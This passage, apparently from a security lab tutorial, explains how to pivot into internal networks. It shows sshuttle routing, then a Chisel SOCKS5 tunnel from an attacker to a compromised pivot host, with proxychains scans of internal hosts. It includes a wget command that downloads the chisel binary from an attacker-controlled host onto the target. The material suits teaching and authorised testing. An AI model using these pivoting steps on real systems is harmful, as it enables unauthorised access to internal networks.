fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
```

We observe that **sshuttle** creates a rule in `iptables` to redirect all traffic toward the `10.10.10.0/24` network through the pivot host. Now we can enumerate the internal network without needing to configure anything additional.

```bash
sudo nmap -p22,80,3306 -sT -Pn -A 10.10.10.3 -vvv
```

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

We observe that we can access the internal network as if we were on the same network segment, discovering that host `10.10.10.3` has ports **22 (SSH)** and **80 (HTTP)** open, all without needing to configure `proxychains` or any other additional tool.

<img src="/budahacksecurity/uploads/md_images/pv/pv12.png" style="max-width:100%; border-radius:8px;">

---

### SOCKS5 Chisel

**Chisel** is a network tunneling tool based on **TCP/UDP**, developed in **Go**, that uses **HTTP** as a transport channel for encapsulated and **SSH**-protected data. It allows establishing **client-server** connections, facilitating the creation of network tunnels in environments with **firewall restrictions**.



**Tunnel Flow**

```
Attacker                   Pivot (compromised)          Internal Network
   │                              │                          │
Firefox                           │                     10.183.0.3
127.0.0.1:1080  ──SOCKS5──>  chisel server             10.183.0.x
   │                          :1234 (HTTP)                   │
chisel client  <──────────────────┤                          │
   └──────────────────────────────┴──────────────────────────┘
                  TCP/UDP tunnel encrypted with SSH
```



**Get the Binary**

Download the pre-compiled binary from GitHub Releases choosing the target architecture:

```
https://github.com/jpillora/chisel/releases
```



**Transfer to the Target**

```bash
# Option 1: SCP
scp chisel pivot@172.17.0.2:/tmp

# Option 2: HTTP server from attacker
python3 -m http.server 8080

# On the target:
wget http://<attacker_ip>:8080/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```



**Start Server on the Pivot**

The listener will accept incoming connections on port **1234** with SOCKS5 and forward traffic to all networks accessible from the pivot host:

```bash
root@e92851867a4d:/tmp# ./chisel server -v -p 1234 --socks5
2026/03/16 11:00:47 server: Fingerprint qPnZ5LXj3A04a0UDwf5ooB0M0D56rvRHC1c8Rugxni0=
2026/03/16 11:00:47 server: Listening on http://0.0.0.0:1234
```



**Start Client on the Attacker**

The client will create a TCP/UDP tunnel over HTTP encrypted with SSH and listen on port **1080**:

```bash
./chisel client -v 172.17.0.2:1234 socks
2026/03/16 11:03:42 client: Connecting to ws://172.17.0.2:1234
2026/03/16 11:03:42 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2026/03/16 11:03:42 client: tun: Bound proxies
2026/03/16 11:03:42 client: Handshaking...
2026/03/16 11:03:42 client: Sending config
2026/03/16 11:03:42 client: Connected (Latency 442.009µs)
2026/03/16 11:03:42 client: tun: SSH connected
```

Verify the tunnel is active:

```bash
ss -tlnp | grep 1080
# LISTEN 0  128  127.0.0.1:1080  0.0.0.0:*  users:(("chisel",pid=XXXX,fd=X))
```



**Configure Proxychains**

Edit /etc/proxychains.conf and add at the end:

```
[ProxyList]
socks5 127.0.0.1 1080
```



**Scan the Internal Network**

```bash
proxychains scapot -t 10.183.0.3 -m top -b
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17

═══════════════════════════════════════════════════
 Scan completed | 2 open port(s)
═══════════════════════════════════════════════════
  ► 22     │ SSH    │ SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15
  ► 80     │ HTTP   │ Apache/2.4.58 (Ubuntu)
═══════════════════════════════════════════════════
 Detected OS  │ Linux/Unix
═══════════════════════════════════════════════════
```



**Access the HTTP Service**

Three available options:

**From the terminal:**

```bash
proxychains firefox 10.183.0.3
```

**From FoxyProxy:**

<img src="/budahacksecurity/uploads/md_images/pv/pv13.png" style="max-width:100%; border-radius:8px;">

**From Firefox's native Proxy:**

<img src="/budahacksecurity/uploads/md_images/pv/pv14.png" style="max-width:100%; border-radius:8px;">